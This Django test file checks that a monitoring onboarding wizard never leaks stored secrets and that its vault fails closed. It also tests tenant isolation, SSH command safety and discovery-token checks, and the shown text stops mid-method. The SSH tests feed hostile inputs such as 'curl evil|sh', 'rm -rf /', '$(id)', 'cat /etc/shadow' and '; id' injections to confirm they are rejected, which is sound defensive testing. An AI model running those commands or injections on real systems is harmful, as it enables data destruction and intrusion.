"""Adversarial credential-security tests (the review of the vault, SSH, discovery token and log token).

Every secret below is a unique needle. After real wizard requests have stored them, the tests look for
the needle in: every rendered page (for several roles), the captured log output, audit rows, step logs,
target facts, exports, the Django debug page (DEBUG=True) and every text/JSON column of every table.
No test opens a socket: the base class refuses real connections and the network is faked.
"""
import json
import logging
import sys
from unittest import mock

from django.apps import apps
from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.db import models as dj_models
from django.test import Client, override_settings
from django.urls import reverse

from core import secrets
from core.models import AuditEvent
from onboarding import install, prometheus_step, sd, services, ssh
from onboarding.models import Credential, CredentialKind, OnboardingTarget, StepLog, TargetType

from .base import KEY, KEY2, OnboardingTestCase, with_key, without_key
from .test_leaks import Capture
from .test_servers import ServersCase

SSH_PW = "needle-ssh-pw-Qx9wP1"
KEY_BODY = "needle-key-body-ZkR55"
SSH_KEY = f"-----BEGIN OPENSSH PRIVATE KEY-----\n{KEY_BODY}\n-----END OPENSSH PRIVATE KEY-----"
COMMUNITY = "needle-community-7Hn2"
V3_AUTH = "needle-v3-auth-pass-81Lm"
V3_PRIV = "needle-v3-priv-pass-92Nq"
BEARER = "needle-bearer-token-33Tt"
BASIC_PW = "needle-basic-pass-44Uu"
PROM_PW = "needle-prom-pass-55Vv"
LOG_TOKEN = "needle-log-ingest-token-66Ww"
ALL_NEEDLES = (SSH_PW, KEY_BODY, COMMUNITY, V3_AUTH, V3_PRIV, BEARER, BASIC_PW, PROM_PW)

class ForceLogin:
    """Log in without the shared test password (superusers here have their own)."""

    def login(self, user):
        self.c = Client(raise_request_exception=False)
        self.c.force_login(user)
        return self.c


PROM_OK = {"url": "https://prom.example.test:9090", "ok": True, "authenticated": True, "stages": [], "errors": [],
           "warnings": [], "version": "2.53.0", "revision": "abc", "go_version": "go1.22", "targets": 5, "up": 4,
           "down": 1, "unknown": 0, "hosts": 5, "jobs": [["node", 5]], "instances": ["a:9100"],
           "checked_at": "2026-01-01T00:00:00+00:00", "duration_ms": 12.0}


def db_hits(needle):
    """(model, field) of every column in every table whose value contains `needle`."""
    hits = []
    text_types = (dj_models.CharField, dj_models.TextField, dj_models.JSONField)
    for model in apps.get_models():
        for field in model._meta.concrete_fields:
            if not isinstance(field, text_types):
                continue
            for value in model._default_manager.using("default").values_list(field.name, flat=True).iterator():
                if value is not None and needle in (value if isinstance(value, str) else json.dumps(value, default=str)):
                    hits.append((model._meta.label, field.name))
                    break
    return hits


@with_key
class WalkSecurityTests(ForceLogin, ServersCase):
    """Real wizard POSTs store every kind of secret; then every page, log and table is searched."""

    def setUp(self):
        super().setUp()
        self.capture = Capture()
        for name in ("", "linkedeye", "django.request"):
            logging.getLogger(name).addHandler(self.capture)
            self.addCleanup(logging.getLogger(name).removeHandler, self.capture)
        self.root = get_user_model().objects.create_superuser("root-sec", "root@example.com", "root-pass-123456")
        self.run_obj.kind = "server"
        self.run_obj.save()
        self.t_ssh = self.host("db-01")
        self.t_key = self.host("db-02")
        self.t_bearer = self.host("db-03")
        self.t_dev = self.host("sw-01", target_type=TargetType.DEVICE, port=9116)
        self.login(self.root)

    def post(self, step, data, **extra):
        return self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, step]), data, **extra)

    def store_all(self):
        self.assertEqual(self.post("credentials", {"action": "save", "name": "ssh-pw", "kind": "ssh_password",
                                                   "username": "svc", "secret": SSH_PW, "apply_to": "none"}).status_code, 302)
        self.post("credentials", {"action": "save", "name": "ssh-key", "kind": "ssh_key", "username": "root",
                                  "secret_multiline": SSH_KEY, "apply_to": "none"})
        self.post("credentials", {"action": "save", "name": "bearer", "kind": "bearer", "secret": BEARER,
                                  "apply_to": "none"})
        self.post("credentials", {"action": "save", "name": "basic", "kind": "basic_auth", "username": "metrics",
                                  "secret": BASIC_PW, "apply_to": "none"})
        snmp_url = reverse("onboarding:snmp_save", args=[self.run_obj.pk])
        self.c.post(snmp_url, {"name": "snmp2", "version": "v2c", "community": COMMUNITY, "module": "if_mib",
                               "apply_to": "none"})
        self.c.post(snmp_url, {"name": "snmp3", "version": "v3", "username": "monitor", "security_level": "authPriv",
                               "auth_protocol": "SHA", "auth_password": V3_AUTH, "priv_protocol": "AES",
                               "priv_password": V3_PRIV, "module": "if_mib", "apply_to": "none"})
        with mock.patch.object(prometheus_step, "fetch_overview", return_value=dict(PROM_OK)), \
                mock.patch.object(prometheus_step, "known_in_product", return_value={"ci": 0, "devices": 0, "discovered": 0}):
            self.c.post(reverse("onboarding:prometheus_connect", args=[self.run_obj.pk]),
                        {"action": "connect", "url": "https://prom.example.test:9090", "username": "prom",
                         "password": PROM_PW, "replace": "on"})
        resp = self.c.post(reverse("onboarding:sd_token"))
        self.sd_token = resp.context["fresh_token"]
        # attach the stored ones so verify really uses them
        by_name = {c.name: c for c in Credential.objects.all()}
        self.assertEqual(len(by_name), 8, sorted(by_name))
        services.attach_credential(self.run_obj, by_name["ssh-pw"], [self.t_ssh])
        services.attach_credential(self.run_obj, by_name["ssh-key"], [self.t_key])
        services.attach_credential(self.run_obj, by_name["bearer"], [self.t_bearer])
        services.attach_credential(self.run_obj, by_name["snmp3"], [self.t_dev])
        return by_name

    def pages(self):
        run = self.run_obj.pk
        urls = [reverse("onboarding:index"), reverse("onboarding:new"), reverse("onboarding:sd_page"),
                reverse("onboarding:log", args=[run]), reverse("onboarding:export"), reverse("administration:audit"),
                reverse("administration:audit_export"), reverse("administration:integrations"),
                reverse("admin:onboarding_credential_changelist"), reverse("admin:onboarding_steplog_changelist"),
                reverse("admin:onboarding_onboardingrun_change", args=[run])]
        urls += [reverse("onboarding:step", args=[run, n]) for n in
                 ("scope", "targets", "credentials", "verify", "enable", "logs", "confirm", "done")]
        urls += [reverse("admin:onboarding_credential_change", args=[c.pk]) for c in Credential.objects.all()]
        return urls

    def assert_nowhere(self, *needles):
        for user in (self.root, self.admin_a, self.operator, self.viewer):
            self.login(user)
            for url in self.pages():
                resp = self.c.get(url)
                body = resp.content.decode("utf-8", "replace")
                for needle in needles:
                    if needle in body:
                        i = body.index(needle)
                        self.fail(f"{needle} in {url} for {user}: ...{body[max(0, i - 200):i + 80]!r}")
        for line in self.capture.lines:
            for needle in needles:
                self.assertNotIn(needle, line)
        for needle in needles:
            self.assertFalse(any(needle in json.dumps(e.details, default=str) + e.object_repr for e in AuditEvent.objects.all()), needle)
            self.assertFalse(any(needle in log.detail for log in StepLog.objects.all()), needle)
            self.assertEqual(db_hits(needle), [], needle)
        for cred in Credential.objects.all():
            self.assertNotIn(cred.secret, "".join(self.capture.lines))

    def test_no_secret_on_any_page_log_audit_or_table_after_storing_every_kind(self):
        self.store_all()
        self.assert_nowhere(*ALL_NEEDLES, KEY, KEY2)

    def test_the_discovery_token_is_not_stored_readably_or_shown_again(self):
        self.store_all()
        self.assert_nowhere(self.sd_token)

    def test_failed_verify_leaks_nothing_to_logs_pages_audit_or_facts(self):
        self.store_all()
        def explode(*args, **kwargs):
            raise RuntimeError(f"connection failed for {SSH_PW} {KEY_BODY} {BEARER}")
        with mock.patch("onboarding.ssh.open_session", side_effect=explode), \
                mock.patch("onboarding.servers.fetch_metrics", side_effect=explode):
            resp = self.post("verify", {"action": "verify"})
        self.assertEqual(resp.status_code, 302)
        self.assertTrue(StepLog.objects.filter(step="verify", status="error").exists())
        for t in OnboardingTarget.objects.all():
            self.assertNotIn(SSH_PW + BEARER, json.dumps(t.facts) + t.last_error)
        self.assert_nowhere(SSH_PW, KEY_BODY, BEARER)

    def test_a_rejected_ssh_login_and_a_hostile_host_reply_leak_nothing(self):
        self.store_all()
        self.world.auth_fail = True
        self.world.facts_out["hostname"] = f"echoes {SSH_PW}"
        self.net.body = f"# HELP x y\nnode_exporter_build_info{{version=\"{BASIC_PW}\"}} 1\n"
        self.post("verify", {"action": "verify"})
        self.assert_nowhere(SSH_PW, KEY_BODY, BEARER, COMMUNITY)

    def test_the_install_output_and_error_are_cleaned_of_the_login(self):
        self.store_all()
        OnboardingTarget.objects.exclude(pk=self.t_ssh.pk).delete()   # the fake host echoes THIS login only
        self.net.exporter_up = False
        self.world.install_result = (1, f"sudo: password {SSH_PW} wrong\n", f"error: {SSH_PW} rejected\n")
        self.world.facts_out["uid"] = "1000"
        self.post("verify", {"action": "verify"})
        self.post("enable", {"action": "enable", "install_over_ssh": "1"})
        self.assert_nowhere(SSH_PW)

    def test_a_viewer_and_an_operator_see_no_credential_list(self):
        self.store_all()
        for user in (self.viewer, self.operator):
            self.login(user)
            body = self.c.get(reverse("onboarding:step", args=[self.run_obj.pk, "credentials"])).content.decode()
            for cred in Credential.objects.all():
                self.assertNotIn(f"<b>{cred.name}</b>", body)

    def test_the_hook_read_is_audited_as_the_operator_who_pressed_the_button(self):
        self.store_all()
        self.login(self.admin_a)
        # admin_a administers the site but the stored rows were created by root: still scoped to the site
        self.post("verify", {"action": "verify"})
        events = AuditEvent.objects.filter(action="credential.use")
        self.assertTrue(events.exists())
        self.assertEqual({e.actor_name for e in events}, {"admin-a"})

    def test_rotation_leaves_neither_the_old_value_nor_the_old_ciphertext(self):
        by_name = self.store_all()
        cred = by_name["ssh-pw"]
        old_blob = Credential.objects.get(pk=cred.pk).secret
        new_pw = "needle-rotated-pw-88Zz"
        self.assertEqual(self.post("credentials", {"action": "rotate", "credential": cred.pk, "secret": new_pw}).status_code, 302)
        self.assertEqual(Credential.objects.filter(name="ssh-pw").count(), 1)
        self.assertNotEqual(Credential.objects.get(pk=cred.pk).secret, old_blob)
        self.assertEqual(db_hits(old_blob), [])
        self.assertEqual(db_hits(SSH_PW), [])
        self.assert_nowhere(SSH_PW, new_pw)
        with secrets.use(Credential.objects.get(pk=cred.pk)) as plain:
            self.assertEqual(plain, new_pw)

    def test_a_v3_login_cannot_be_rotated_with_a_bare_string(self):
        by_name = self.store_all()
        blob = Credential.objects.get(pk=by_name["snmp3"].pk).secret
        self.post("credentials", {"action": "rotate", "credential": by_name["snmp3"].pk, "secret": "oops"})
        self.assertEqual(Credential.objects.get(pk=by_name["snmp3"].pk).secret, blob)


# ----------------------------------------------------------------------------- fail closed
@with_key
class FailClosedTests(ForceLogin, OnboardingTestCase):
    def setUp(self):
        super().setUp()
        self.run_ = self.make_run(step="credentials")
        self.make_target(self.run_, "db-01")
        self.root = get_user_model().objects.create_superuser("root-fc", "fc@example.com", "root-pass-123456")
        self.login(self.root)

    def attempts(self):
        step = reverse("onboarding:step", args=[self.run_.pk, "credentials"])
        out = [self.c.post(step, {"action": "save", "name": "x", "kind": "ssh_password", "username": "u",
                                  "secret": SSH_PW, "apply_to": "all"}),
               self.c.post(reverse("onboarding:snmp_save", args=[self.run_.pk]),
                           {"name": "s", "version": "v2c", "community": COMMUNITY, "module": "if_mib"}),
               self.c.post(reverse("onboarding:sd_token"))]
        with mock.patch.object(prometheus_step, "fetch_overview", return_value=dict(PROM_OK)), \
                mock.patch.object(prometheus_step, "known_in_product", return_value={"ci": 0, "devices": 0, "discovered": 0}):
            out.append(self.c.post(reverse("onboarding:prometheus_connect", args=[self.run_.pk]),
                                   {"action": "connect", "url": "https://prom.example.test:9090", "username": "p",
                                    "password": PROM_PW, "replace": "on"}))
        return out

    def check_closed(self):
        self.assertEqual(Credential.objects.count(), 0)
        for needle in (SSH_PW, COMMUNITY, PROM_PW):
            self.assertEqual(db_hits(needle), [])
        for resp in self.attempts():
            self.assertIn(resp.status_code, (200, 302))
            self.assertNotIn(SSH_PW, resp.content.decode())
        self.assertEqual(Credential.objects.count(), 0)
        for needle in (SSH_PW, COMMUNITY, PROM_PW):
            self.assertEqual(db_hits(needle), [])
        with self.assertRaises(secrets.VaultUnavailable):
            secrets.store(CredentialKind.BEARER, "", SSH_PW, "Mumbai", self.root)
        self.assertEqual(Credential.objects.count(), 0)

    @without_key
    def test_no_key_nothing_is_stored_anywhere(self):
        self.check_closed()

    def test_no_cryptography_library_nothing_is_stored_anywhere(self):
        with mock.patch.dict(sys.modules, {"cryptography": None, "cryptography.fernet": None}):
            self.assertFalse(secrets.available())
            self.check_closed()

    @override_settings(LINKEDEYE_CREDENTIAL_KEY="not-a-fernet-key")
    def test_a_malformed_key_nothing_is_stored_and_the_key_is_not_echoed(self):
        self.check_closed()
        step = reverse("onboarding:step", args=[self.run_.pk, "credentials"])
        body = self.c.post(step, {"action": "save", "name": "x", "kind": "ssh_password", "secret": SSH_PW}, follow=True)
        self.assertNotIn("not-a-fernet-key", body.content.decode())

    def test_rotate_without_a_key_keeps_the_old_ciphertext(self):
        cred = secrets.store(CredentialKind.SSH_PASSWORD, "svc", SSH_PW, self.run_.site, self.root, name="keep")
        blob = Credential.objects.get(pk=cred.pk).secret
        with override_settings(LINKEDEYE_CREDENTIAL_KEY=""):
            self.c.post(reverse("onboarding:step", args=[self.run_.pk, "credentials"]),
                        {"action": "rotate", "credential": cred.pk, "secret": "new-one-without-key"})
        self.assertEqual(Credential.objects.get(pk=cred.pk).secret, blob)
        self.assertEqual(db_hits("new-one-without-key"), [])

    def test_the_key_itself_is_never_in_the_database(self):
        secrets.store(CredentialKind.SSH_PASSWORD, "svc", SSH_PW, self.run_.site, self.root, name="k")
        self.assertEqual(db_hits(KEY), [])

    def test_a_wrong_key_reads_as_a_clear_error_without_the_ciphertext(self):
        cred = secrets.store(CredentialKind.SSH_PASSWORD, "svc", SSH_PW, self.run_.site, self.root, name="k")
        with override_settings(LINKEDEYE_CREDENTIAL_KEY=KEY2):
            with self.assertRaises(secrets.VaultError) as ctx:
                with secrets.use(cred):
                    pass
        self.assertNotIn(cred.secret, str(ctx.exception))
        self.assertNotIn(KEY2, str(ctx.exception))
        self.assertIsNone(ctx.exception.__cause__)


# ----------------------------------------------------------------------------- DEBUG=True
@override_settings(DEBUG=True)
@with_key
class DebugPageTests(ForceLogin, OnboardingTestCase):
    """With DEBUG on, Django renders the exception, its frames' local variables and the POST body. None of
    those may carry a secret: the views are decorated with sensitive_post_parameters / sensitive_variables."""

    def setUp(self):
        super().setUp()
        self.run_ = self.make_run(step="credentials")
        self.make_target(self.run_, "db-01")
        self.make_target(self.run_, "sw-01", target_type=TargetType.DEVICE, port=9116)
        self.root = get_user_model().objects.create_superuser("root-dbg", "dbg@example.com", "root-pass-123456")
        self.login(self.root)

    def crash(self, url, data, *needles):
        with mock.patch("cryptography.fernet.Fernet.encrypt", side_effect=RuntimeError("fernet exploded")):
            resp = self.c.post(url, data)
        body = resp.content.decode("utf-8", "replace")
        self.assertEqual(resp.status_code, 500)
        self.assertIn("fernet exploded", body)               # the debug page really rendered: this is not vacuous
        for needle in needles:
            self.assertNotIn(needle, body, needle)
        return body

    def test_the_wizard_credential_post(self):
        self.crash(reverse("onboarding:step", args=[self.run_.pk, "credentials"]),
                   {"action": "save", "name": "x", "kind": "ssh_password", "username": "svc", "secret": SSH_PW},
                   SSH_PW)
        self.crash(reverse("onboarding:step", args=[self.run_.pk, "credentials"]),
                   {"action": "save", "name": "x", "kind": "ssh_key", "username": "svc", "secret_multiline": SSH_KEY},
                   KEY_BODY)

    def test_the_snmp_post(self):
        url = reverse("onboarding:snmp_save", args=[self.run_.pk])
        self.crash(url, {"name": "s", "version": "v2c", "community": COMMUNITY, "module": "if_mib"}, COMMUNITY)
        self.crash(url, {"name": "s", "version": "v3", "username": "m", "security_level": "authPriv",
                         "auth_password": V3_AUTH, "priv_password": V3_PRIV, "auth_protocol": "SHA",
                         "priv_protocol": "AES", "module": "if_mib"}, V3_AUTH, V3_PRIV)

    def test_the_prometheus_post(self):
        with mock.patch.object(prometheus_step, "fetch_overview", return_value=dict(PROM_OK)), \
                mock.patch.object(prometheus_step, "known_in_product", return_value={"ci": 0, "devices": 0, "discovered": 0}):
            self.crash(reverse("onboarding:prometheus_connect", args=[self.run_.pk]),
                       {"action": "connect", "url": "https://prom.example.test:9090", "username": "p",
                        "password": PROM_PW, "replace": "on"}, PROM_PW)

    def test_the_rotate_post(self):
        cred = secrets.store(CredentialKind.SSH_PASSWORD, "svc", "old-pw-needle-1", self.run_.site, self.root, name="r")
        self.crash(reverse("onboarding:step", args=[self.run_.pk, "credentials"]),
                   {"action": "rotate", "credential": cred.pk, "secret": SSH_PW}, SSH_PW, "old-pw-needle-1")

    def test_the_discovery_token_post(self):
        with mock.patch("onboarding.sd.secrets.generate_token", return_value=LOG_TOKEN):
            self.crash(reverse("onboarding:sd_token"), {}, LOG_TOKEN)

    def test_a_crash_while_a_hook_holds_the_login_shows_no_local_variable(self):
        """The exception comes from inside a hook that has the decrypted password in a local."""
        cred = secrets.store(CredentialKind.SSH_PASSWORD, "svc", SSH_PW, self.run_.site, self.root, name="h")
        services.attach_credential(self.run_, cred)

        with mock.patch("onboarding.steps.verify_target", side_effect=SystemError("hook exploded")):
            resp = self.c.post(reverse("onboarding:step", args=[self.run_.pk, "verify"]), {"action": "verify"})
        self.assertNotIn(SSH_PW, resp.content.decode())

    def test_the_sd_endpoint_401_is_the_same_under_debug(self):
        sd.issue_token(self.root)
        resp = Client().get("/api/sd/targets.json", HTTP_AUTHORIZATION="Bearer wrong-token")
        self.assertEqual(resp.status_code, 401)
        self.assertEqual(resp.json(), {"error": "Invalid or missing bearer token"})

    def test_the_debug_settings_page_cleanses_the_vault_key(self):
        with override_settings(LINKEDEYE_CREDENTIAL_KEY=KEY):
            resp = self.c.get("/definitely-not-a-url/")
        self.assertNotIn(KEY, resp.content.decode())


# ----------------------------------------------------------------------------- site / tenant isolation
@with_key
class IsolationTests(ForceLogin, ServersCase):
    def setUp(self):
        super().setUp()
        self.root = get_user_model().objects.create_superuser("root-iso", "iso@example.com", "root-pass-123456")
        self.run_b = self.make_run(site=self.site_b.name)
        self.cred_b = secrets.store(CredentialKind.SSH_PASSWORD, "svc-b", "needle-site-b-pw", self.site_b.name,
                                    self.admin_b, name="chennai-ssh")
        self.t = self.host("db-01")

    def step(self, name="credentials"):
        return reverse("onboarding:step", args=[self.run_obj.pk, name])

    def test_another_sites_credential_cannot_be_attached_rotated_or_deleted(self):
        self.login(self.admin_a)
        blob = Credential.objects.get(pk=self.cred_b.pk).secret
        for action, extra in (("attach", {}), ("rotate", {"secret": "hijack-needle"}), ("delete", {})):
            resp = self.c.post(self.step(), {"action": action, "credential": self.cred_b.pk, **extra})
            self.assertEqual(resp.status_code, 404, action)
        self.assertEqual(Credential.objects.get(pk=self.cred_b.pk).secret, blob)
        self.t.refresh_from_db()
        self.assertIsNone(self.t.credential_id)
        body = self.c.get(self.step()).content.decode()
        self.assertNotIn("chennai-ssh", body)

    def test_site_admin_a_cannot_reach_site_bs_run(self):
        self.login(self.admin_a)
        url = reverse("onboarding:step", args=[self.run_b.pk, "credentials"])
        self.assertEqual(self.c.get(url).status_code, 404)
        self.assertEqual(self.c.post(url, {"action": "save", "name": "x", "kind": "bearer", "secret": "s"}).status_code, 404)

    def test_a_credential_forced_onto_a_target_of_another_site_is_not_used(self):
        self.t.credential = self.cred_b
        self.t.save()
        self.post_verify_and_assert_unused()

    def test_a_tenant_wide_row_is_never_sent_to_a_host(self):
        """The Prometheus login and the discovery token have site "": they must never reach a host check."""
        tenant_wide = secrets.store(CredentialKind.BEARER, "", "needle-tenant-wide", "", self.root, name="tw")
        self.t.credential = tenant_wide
        self.t.save()
        self.post_verify_and_assert_unused()
        basic = secrets.store(CredentialKind.BASIC_AUTH, "prom", "needle-prom-login", "", self.root, name="pl")
        self.t.credential = basic
        self.t.save()
        self.post_verify_and_assert_unused()

    def test_another_tenants_row_is_never_used(self):
        row = secrets.store(CredentialKind.BEARER, "", "needle-other-tenant", self.site_a.name, self.root,
                            name="ot", tenant_key="someone-else")
        self.t.credential = row
        self.t.save()
        self.post_verify_and_assert_unused()

    def post_verify_and_assert_unused(self):
        self.login(self.admin_a)
        before = AuditEvent.objects.filter(action="credential.use").count()
        self.c.post(self.step("verify"), {"action": "verify"})
        self.assertEqual(AuditEvent.objects.filter(action="credential.use").count(), before)
        for req in self.net.requests:
            self.assertNotIn("Authorization", req["headers"])
        self.assertEqual(self.world.credentials_sent, [])
        self.assertEqual(self.world.connects, [])

    def test_the_prometheus_login_cannot_be_selected_from_a_sites_credentials_step(self):
        self.login(self.root)
        with mock.patch.object(prometheus_step, "fetch_overview", return_value=dict(PROM_OK)), \
                mock.patch.object(prometheus_step, "known_in_product", return_value={"ci": 0, "devices": 0, "discovered": 0}):
            self.c.post(reverse("onboarding:prometheus_connect", args=[self.run_obj.pk]),
                        {"action": "connect", "url": "https://prom.example.test:9090", "username": "prom",
                         "password": PROM_PW, "replace": "on"})
        login = Credential.objects.get(kind="basic_auth")
        self.assertEqual(login.site, "")
        blob = login.secret
        self.login(self.admin_a)
        for action, extra in (("attach", {}), ("rotate", {"secret": "hijack"}), ("delete", {})):
            self.assertEqual(self.c.post(self.step(), {"action": action, "credential": login.pk, **extra}).status_code,
                             404, action)
        self.assertEqual(Credential.objects.get(pk=login.pk).secret, blob)
        listed = {c.pk for c in self.c.get(self.step()).context["credentials"]}
        self.assertNotIn(login.pk, listed)

    def test_the_discovery_token_cannot_be_selected_either(self):
        row, _token = sd.issue_token(self.root)
        self.login(self.admin_a)
        for action in ("attach", "rotate", "delete"):
            self.assertEqual(self.c.post(self.step(), {"action": action, "credential": row.pk, "secret": "x"}).status_code, 404)
        self.assertTrue(Credential.objects.filter(pk=row.pk).exists())

    def test_the_discovery_page_and_token_need_every_site(self):
        self.login(self.admin_a)
        self.assertEqual(self.c.get(reverse("onboarding:sd_page")).status_code, 403)
        self.assertEqual(self.c.post(reverse("onboarding:sd_token")).status_code, 403)

    def test_the_prometheus_login_is_not_sent_to_a_host_from_a_site_target(self):
        """A site admin who attached the connected Prometheus' login to a prometheus target of their own
        site must still not have it sent to another host."""
        self.login(self.root)
        with mock.patch.object(prometheus_step, "fetch_overview", return_value=dict(PROM_OK)), \
                mock.patch.object(prometheus_step, "known_in_product", return_value={"ci": 0, "devices": 0, "discovered": 0}):
            self.c.post(reverse("onboarding:prometheus_connect", args=[self.run_obj.pk]),
                        {"action": "connect", "url": "https://prom.example.test:9090", "username": "prom",
                         "password": PROM_PW, "replace": "on"})
        login = Credential.objects.get(kind="basic_auth")
        evil = self.make_target(self.run_obj, "evil.example.test", target_type=TargetType.PROMETHEUS, port=9090,
                                credential=login)
        seen = []
        with mock.patch.object(prometheus_step, "fetch_overview",
                               side_effect=lambda url, user="", pw="": seen.append((url, user, pw)) or dict(PROM_OK)):
            prometheus_step.verify_prometheus(evil)
        self.assertEqual([s for s in seen if s[2] == PROM_PW and "evil" in s[0]], [])


# ----------------------------------------------------------------------------- SSH
@with_key
class SshSafetyTests(ForceLogin, ServersCase):
    def test_no_command_is_built_from_the_form(self):
        t = self.host("db-01")
        t.credential = self.cred()
        t.save()
        self.net.exporter_up = False
        self.world.facts_out["uid"] = "1000"
        self.login(self.admin_a)
        step = reverse("onboarding:step", args=[self.run_obj.pk, "enable"])
        self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, "verify"]), {"action": "verify"})
        self.c.post(step, {"action": "enable", "install_over_ssh": "1", "install_command": "rm -rf /",
                           "snmp_module": "$(id)", "port": "9100; id", "command": "curl evil|sh"})
        self.assertEqual(self.world.unexpected, [])
        for command in self.world.commands:
            self.assertNotIn("rm -rf", command)
            self.assertNotIn("evil", command)
        for blob_command in self.world.installs:
            self.assertIn("base64 -d", blob_command)
            self.assertNotIn("$(id)", blob_command.replace('"$(printf %s', ""))

    def test_the_session_only_runs_named_commands_and_a_validated_port(self):
        for bad in ("id; rm -rf /", "uname -a", "cat /etc/shadow"):
            self.assertNotIn(bad, ssh.allowed_commands("linux").values())
        session = ssh.Session(mock.Mock(), mock.Mock(), mock.Mock(expired=False), "pw", ssh._Pin(""), "ssh-ed25519", "10.0.0.5")
        with self.assertRaises(KeyError):
            session.run("id; rm -rf /")
        with self.assertRaises(ValueError):
            session.run_install("linux", "9100; id", "root")
        with self.assertRaises(ValueError):
            install.linux_install_script("9100 && id")
        with self.assertRaises(ValueError):
            install.systemd_unit(0)

    def test_hostile_host_names_never_reach_a_command_or_a_scrape_block(self):
        rows, bad = services.parse_target_list("db-01\n$(id)\na;b\n`x`\nok-host\nx y\n10.0.0.5; id\nh'o\"st")
        self.assertEqual({r["hostname"] for r in rows}, {"db-01", "ok-host"})
        self.assertEqual(len(bad), 6)

    def test_the_host_key_is_checked_before_a_password_leaves(self):
        t = self.host("db-01")
        t.credential = self.cred()
        t.facts = {"ssh_host_key": ssh.fingerprint(b"some-other-key")}
        t.save()
        self.login(self.admin_a)
        self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, "verify"]), {"action": "verify"})
        t.refresh_from_db()
        self.assertEqual(self.world.credentials_sent, [])
        self.assertEqual(t.state, "failed")
        self.assertEqual(t.facts["ssh_host_key"], ssh.fingerprint(b"some-other-key"))   # the pin is never overwritten

    def test_a_failed_login_does_not_replace_the_pin(self):
        t = self.host("db-01")
        t.credential = self.cred()
        t.facts = {"ssh_host_key": ssh.fingerprint(self.world.host_key)}
        t.save()
        self.world.auth_fail = True
        self.login(self.admin_a)
        self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, "verify"]), {"action": "verify"})
        t.refresh_from_db()
        self.assertEqual(t.facts["ssh_host_key"], ssh.fingerprint(self.world.host_key))

    def test_host_key_pin_key_is_not_a_scrubbed_name(self):
        self.assertEqual(services.scrub({"ssh_host_key": "SHA256:x"}), {"ssh_host_key": "SHA256:x"})

    def test_password_goes_to_sudo_on_stdin_never_on_a_command_line(self):
        t = self.host("db-01")
        t.credential = self.cred()
        t.save()
        self.net.exporter_up = False
        self.world.facts_out["uid"] = "1000"
        self.login(self.admin_a)
        self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, "verify"]), {"action": "verify"})
        self.c.post(reverse("onboarding:step", args=[self.run_obj.pk, "enable"]), {"action": "enable", "install_over_ssh": "1"})
        for command in self.world.commands:
            self.assertNotIn("sup3r-secret", command)
        self.assertTrue(any(b"sup3r-secret" in data for data in self.world.stdin))   # ...it went on stdin


# ----------------------------------------------------------------------------- discovery endpoint
@with_key
class DiscoveryEndpointSecurityTests(ForceLogin, OnboardingTestCase):
    def setUp(self):
        super().setUp()
        self.root = get_user_model().objects.create_superuser("root-sdx", "sdx@example.com", "root-pass-123456")
        _row, self.token = sd.issue_token(self.root)
        run = self.make_run(site="Mumbai")
        self.make_target(run, "secret-host-01", state="scraping")
        self.anon = Client()

    def test_the_token_is_compared_in_constant_time(self):
        import hmac
        real = hmac.compare_digest
        with mock.patch("onboarding.sd.hmac.compare_digest", side_effect=real) as spy:
            self.assertEqual(self.anon.get("/api/sd/targets.json", HTTP_AUTHORIZATION=f"Bearer {self.token}").status_code, 200)
            self.assertEqual(self.anon.get("/api/sd/targets.json", HTTP_AUTHORIZATION="Bearer nope").status_code, 401)
        self.assertEqual(spy.call_count, 2)

    def test_no_wrong_token_learns_anything(self):
        bodies = set()
        for header in ({}, {"HTTP_AUTHORIZATION": "Bearer "}, {"HTTP_AUTHORIZATION": "Bearer nope"},
                       {"HTTP_AUTHORIZATION": f"Basic {self.token}"}, {"HTTP_AUTHORIZATION": self.token},
                       {"HTTP_AUTHORIZATION": f"Bearer {self.token[:-1]}"},
                       {"HTTP_AUTHORIZATION": f"Bearer {self.token}x"}, {"HTTP_AUTHORIZATION": "Bearer éè"}):
            cache.clear()
            resp = self.anon.get("/api/sd/targets.json", **header)
            self.assertEqual(resp.status_code, 401, header)
            bodies.add(resp.content)
            self.assertNotIn(b"secret-host-01", resp.content)
        self.assertEqual(len(bodies), 1)

    def test_the_token_is_not_accepted_in_the_query_string_or_a_cookie(self):
        for kwargs in ({"data": {"token": self.token}}, {"data": {"access_token": self.token}},
                       {"HTTP_COOKIE": f"token={self.token}"}, {"HTTP_X_API_KEY": self.token}):
            cache.clear()
            self.assertEqual(self.anon.get("/api/sd/targets.json", **kwargs).status_code, 401)

    def test_a_session_login_does_not_replace_the_token(self):
        self.anon.force_login(self.root)
        self.assertEqual(self.anon.get("/api/sd/targets.json").status_code, 401)

    def test_other_methods_are_refused_and_no_wildcard_cors(self):
        resp = self.anon.post("/api/sd/targets.json", HTTP_AUTHORIZATION=f"Bearer {self.token}")
        self.assertEqual(resp.status_code, 405)
        ok = self.anon.get("/api/sd/targets.json", HTTP_AUTHORIZATION=f"Bearer {self.token}")
        self.assertNotIn("Access-Control-Allow-Origin", ok)
        self.assertEqual(ok["Cache-Control"], "no-store")

    def test_the_old_token_dies_on_rotation(self):
        _row, new = sd.issue_token(self.root)
        self.assertNotEqual(new, self.token)
        self.assertEqual(self.anon.get("/api/sd/targets.json", HTTP_AUTHORIZATION=f"Bearer {self.token}").status_code, 401)
        self.assertEqual(self.anon.get("/api/sd/targets.json", HTTP_AUTHORIZATION=f"Bearer {new}").status_code, 200)
        self.assertEqual(db_hits(self.token), [])


# ----------------------------------------------------------------------------- the log token
@override_settings(LOG_INGEST_TOKEN=LOG_TOKEN, LINKEDEYE_PORTAL_URL="https://console.example.test/")
@with_key
class LogTokenTests(ForceLogin, OnboardingTestCase):
    def setUp(self):
        super().setUp()
        self.root = get_user_model().objects.create_superuser("root-lg", "lg@example.com", "root-pass-123456")
        self.run_ = self.make_run(step="logs")
        self.t = self.make_target(self.run_, "db-01")

    def generate(self, user):
        self.login(user)
        return self.c.post(reverse("onboarding:step", args=[self.run_.pk, "logs"]), {"action": "logs"})

    def test_a_site_admin_gets_a_placeholder_not_the_shared_ingest_token(self):
        resp = self.generate(self.admin_a)
        self.assertEqual(resp.status_code, 200)
        body = resp.content.decode()
        self.assertNotIn(LOG_TOKEN, body)
        self.assertIn("LOG_INGEST_TOKEN", body)
        self.assertEqual(db_hits(LOG_TOKEN), [])

    def test_an_all_sites_admin_sees_it_once_and_it_is_stored_redacted(self):
